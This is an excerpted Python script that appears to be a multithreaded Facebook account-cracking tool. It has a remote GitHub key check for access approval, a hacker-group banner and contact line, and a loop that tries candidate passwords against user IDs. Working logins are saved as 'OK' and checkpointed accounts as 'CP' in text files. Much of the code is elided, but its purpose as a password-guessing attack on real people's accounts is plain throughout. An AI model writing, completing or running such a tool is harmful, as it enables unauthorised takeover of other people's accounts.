...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://raw.githubusercontent.com/BLACK-HUNTER-TEEM/BHT-PRO/main/Apruve.txt"])
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER >> m.me/Rakib0fficials.id")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/BLACK-HUNTER-TEEM/BHT-PRO/main/Apruve.txt').text
			if basesplit in plr:
				key = basesplit
		...
		print ("""\033[1;92m  
 __  __ _____    _____            _  _______ ____  
 |  \/  |  __ \  |  __ \     /\   | |/ /_   _|  _ \ 
 | \  / | |__) | | |__) |   /  \  | ' /  | | | |_) |
 | |\/| |  _  /  |  _  /   / /\ \ |  <   | | |  _ < 
 | |  | | | \ \  | | \ \  / ____ \| . \ _| |_| |_) |
...
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : it's MR.RAKIB.404
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n%s [+] OK RESULTS SAVED IN -MR RAKIB ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> MR-RAKIB cp.txt"%(Y))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MR-RAKIB] : %s/%s -> \033[0;92m [ MR-RAKIB-OK:%s ]- \033[0;91m[MR-RAKIB-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
